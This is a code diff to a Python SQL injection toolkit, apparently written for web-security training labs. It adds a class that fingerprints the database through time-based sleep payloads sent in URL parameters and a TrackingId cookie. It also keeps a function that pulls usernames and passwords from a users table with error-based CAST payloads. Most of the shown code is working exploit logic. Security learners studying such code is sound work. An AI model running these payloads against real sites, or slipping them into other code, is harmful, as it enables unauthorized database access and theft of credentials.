@@ -3,11 +3,11 @@ import requests
 import difflib
 from bs4 import BeautifulSoup
 import re
+import string
 from urllib3.util import url
 
 session = requests.Session()
-CHAR_LIST = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
-
+CHAR_LIST = string.ascii_letters + string.digits + string.punctuation
 base_url = 'url'
 
 def post_injection(ses, url, username, password, csrf_field='csrf', success_indicator=None):
@@ -41,9 +41,6 @@ def show_text(url ,ses):
     url_response = ses.get(url)
     print(url_response.text)
     print(url_response.cookies)
-
-
-
 
 class blind_inj:
     def __init__(self, ses, url, dbms = "postgresql", cookie_name="TrackingId", charset = None):
@@ -154,70 +151,6 @@ class blind_inj:
                 print("Can't find a letter")
                 break
 
-
-def make_payloads(base, delay):
-    return {
-        "Oracle":          f"{base}'||dbms_pipe.receive_message('', {delay})||'",
-        "PostgreSQL":      f"{base}'||(SELECT pg_sleep({delay}))||'",
-        "Microsoft SQL":   f"{base}';WAITFOR DELAY '0:0:{delay}'--",
-        "MySQL/MariaDB":   f"{base}' AND SLEEP({delay})-- ",
-    }
-
-def url_sql_verify(ses, url, delay):
-    baseline = ses.get(url)
-    print(f"Baseline status: {baseline.status_code}, length: {len(baseline.text)}")
-
-    for db, payload in make_payloads("", delay).items():
-        test_url = url + quote(payload, safe='')
-        try:
-            response = ses.get(test_url, timeout=delay+5)
-            elapsed = response.elapsed.total_seconds()
-            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
-        except Exception as e:
-            print(f"{db}: request failed ({e})")
-
-def cookie_sql_verify(ses, url, delay):
-    resp = ses.get(url)
-    tracking_id = resp.cookies.get("TrackingId")
-    session_id = resp.cookies.get("session")
-
-    if tracking_id is None:
-        print("Tracking ID not found")
-        return
-
-    for db, payload in make_payloads(tracking_id, delay).items():
-        cookies_injection = {
-            "TrackingId": payload,
-            "session": session_id
-        }
-        try:
-            response = ses.get(url, cookies=cookies_injection, timeout=delay+5)
-            elapsed = response.elapsed.total_seconds()
-            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
-        except Exception as e:
-            print(f"{db}: request failed ({e})")
-
-
-def cast_inj(ses, url):
-
-    payload_login = "'AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--"
-    payload_pass = "'AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--"
-    c = (payload_pass, payload_login)
-
-    for i in c:
-        cookies = {
-            "TrackingId": i
-        }
-        response = ses.get(url, cookies=cookies)
-
-        match = re.search(r'invalid input syntax for type integer: "(.*?)"', response.text)
-
-        if match:
-            print(f"We found {match.group(1)}")
-        else:
-            print(f"Nothing found, check the payload or server response")
-            print(response.text[:1000])
-
 class union_table_recon:
     def __init__(self, url, ses, dbms = "postgresql"):
         self.url = url
@@ -253,6 +186,96 @@ class union_table_recon:
             else:
                 print(f"Column {ind + 1} - Have string format")
 
+class dbms_verify_time_based:
+    def __init__(self, url, ses, delay=5, cookie_name="TrackingId"):
+        self.url = url
+        self.ses = ses
+        self.delay = delay
+        self.cookie_name = cookie_name
+
+    def make_payloads(self, base=""):
+        return {
+            "Oracle":        f"{base}'||dbms_pipe.receive_message('', {self.delay})||'",
+            "PostgreSQL":    f"{base}'||(SELECT pg_sleep({self.delay}))||'",
+            "Microsoft SQL": f"{base}';WAITFOR DELAY '0:0:{self.delay}'--",
+            "MySQL/MariaDB": f"{base}' AND SLEEP({self.delay})-- ",
+        }
+
+    def _test_payload(self,db_name, request_funk):
+        try:
+            response = request_funk()
+            elapsed = response.elapsed.total_seconds()
+            print(f"  [{db_name}] Time: {elapsed:.2f}s | Status: {response.status_code}")
+
+            if elapsed >= self.delay:
+                return True
+        except Exception as e:
+            print(f"  [{db_name}] Error: {e}")
+        return False
+
+    def url_sql_verify(self):
+        print("[*] Testing URL parameter injection...")
+        for db, payload in self.make_payloads("").items():
+            test_url = self.url + quote(payload, safe='')
+            if self._test_payload(db, lambda: self.ses.get(test_url, timeout=self.delay+5)):
+                return db
+        return None
+
+    def cookie_sql_verify(self):
+        print("[*] Testing Cookie injection...")
+        self.ses.cookies.clear()
+        resp = self.ses.get(self.url)
+        tracking_id = resp.cookies.get(self.cookie_name)
+        session_id = resp.cookies.get("session")
+
+        if not tracking_id:
+            print("[-] TrackingId cookie not found!")
+            return None
+
+        for db, payload in self.make_payloads(tracking_id).items():
+            cookies_injection = {self.cookie_name: payload}
+            if session_id:
+                cookies_injection["session"] = session_id
+
+            if self._test_payload(db, lambda: self.ses.get(self.url, cookies=cookies_injection, timeout=self.delay + 5)):
+                return db
+        return None
+
+    def verify(self):
+        detected_db = self.url_sql_verify()
+        if detected_db:
+            print(f"[+] Detected DBMS via URL: {detected_db}")
+            return detected_db
+
+        detected_db = self.cookie_sql_verify()
+        if detected_db:
+            print(f"[+] Detected DBMS via URL: {detected_db}")
+            return detected_db
+
+        print("[-] Could not determine DBMS using Time-Based vectors.")
+        return None
+
+
+def cast_inj(ses, url):
+
+    payload_login = "'AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--"
+    payload_pass = "'AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--"
+    c = (payload_pass, payload_login)
+
+    for i in c:
+        cookies = {
+            "TrackingId": i
+        }
+        response = ses.get(url, cookies=cookies)
+
+        match = re.search(r'invalid input syntax for type integer: "(.*?)"', response.text)
+
+        if match:
+            print(f"We found {match.group(1)}")
+        else:
+            print(f"Nothing found, check the payload or server response")
+            print(response.text[:1000])
+
 def information_schema_table(ses, url):
     response = ses.get(url)
     text1 = response.text.splitlines()
@@ -282,6 +305,6 @@ def information_schema_columns(ses, url):
             print(lines)
 
 
-
 if __name__ == "__main__":
-    show_text(base_url, session)
+    verifier = dbms_verify_time_based(base_url, session, delay=5)
+    dbms = verifier.verify()
